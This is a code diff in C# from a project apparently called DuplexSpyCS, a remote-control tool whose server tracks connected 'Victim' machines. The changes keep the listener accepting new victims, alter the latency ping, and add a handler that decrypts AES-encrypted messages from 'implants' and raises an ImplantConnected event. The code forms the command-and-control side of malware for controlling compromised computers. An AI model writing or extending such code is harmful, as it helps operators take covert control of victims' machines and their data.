@@ -50,6 +50,9 @@ namespace DuplexSpyCS
         public delegate void DisconenctedEventHandler(Victim v);
         public event DisconenctedEventHandler Disconencted; //Disconnected event.
 
+        public delegate void ImplantConnectedHandler(Listener l, Victim v, string[] aszMsg);
+        public event ImplantConnectedHandler ImplantConnected;
+
         #endregion
 
         //STATUS
@@ -184,6 +187,7 @@ namespace DuplexSpyCS
             try
             {
                 Socket client = handler.EndAccept(ar);
+                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
                 if (l_victim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
                 {
                     client.Disconnect(true);
@@ -191,8 +195,7 @@ namespace DuplexSpyCS
                 }
                 Victim v = new Victim(client);
                 v.ID = client.RemoteEndPoint.ToString();
-                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
-                v.socket.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
+                client.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
             }
             catch (Exception ex)
             {
@@ -314,22 +317,25 @@ namespace DuplexSpyCS
                                 }
                                 else if (dsp.Param == 1)
                                 {
-                                    int nDelay = 1000;
-
-                                    new Thread(() =>
+                                    Task.Run(() =>
                                     {
+                                        int nDelay = 1000;
                                         DateTime datetime = DateTime.Now;
                                         TimeSpan span = datetime - v.last_sent;
                                         v.latency_time = span.Milliseconds;
                                         v.last_sent = datetime;
 
-                                        v.encSend(2, 1, datetime.ToString("F"));
-                                    }).Start();
+                                        v.encSend(2, 1, clsEZData.fnGenerateRandomStr());
+                                    });
                                 }
                             }
-                            else if (dsp.Command == 3)
+                            else if (dsp.Command == 3) //Implant
                             {
+                                byte[] abEncData = dsp.GetMsg().msg;
+                                string szDecData = Crypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abEncData)), v._AES.key, v._AES.iv);
+                                string[] aszMsg = szDecData.Split("|");
 
+                                ImplantConnected(this, v, aszMsg);
                             }
                         }
                     }
